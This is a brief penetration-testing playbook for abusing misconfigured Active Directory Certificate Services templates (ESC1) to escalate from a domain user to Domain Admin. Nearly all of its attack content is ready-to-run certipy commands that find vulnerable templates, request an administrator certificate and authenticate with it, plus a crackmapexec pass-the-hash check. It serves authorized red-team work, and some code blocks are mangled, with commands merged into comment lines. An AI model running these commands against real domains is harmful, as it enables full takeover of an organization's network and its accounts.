# AD CS Abuse - ESC1 (Subject Alternative Name)

## When to Use
- When operating in a Windows Active Directory environment and you discover that Active Directory Certificate Services (AD CS) is deployed (PKI infrastructure).
- To massively escalate privileges from a standard domain user to Domain Admin by exploiting misconfigured certificate templates.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying AD CS and Vulnerable Templates (ESC1)

```text
# Concept: ESC1 ```

```bash
# certipy find -u user@domain.local -p Password123! -dc-ip 10.10.10.10 -vulnerable
```

### Phase 2: Requesting the Certificate

```bash
# Concept: With a vulnerable template certipy req -u user@domain.local -p Password123! -dc-ip 10.10.10.10 -ca CA-NAME -template VulnerableTemplate -upn administrator@domain.local
```

### Phase 3: Authenticating with the Certificate (Pass-the-Certificate)

```bash
# Concept: certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -domain domain.local
```

### Phase 4: Validating Access

```bash
# crackmapexec smb 10.10.10.10 -u administrator -H [NTLM_HASH_OBTAINED_FROM_CERTIPY]
```
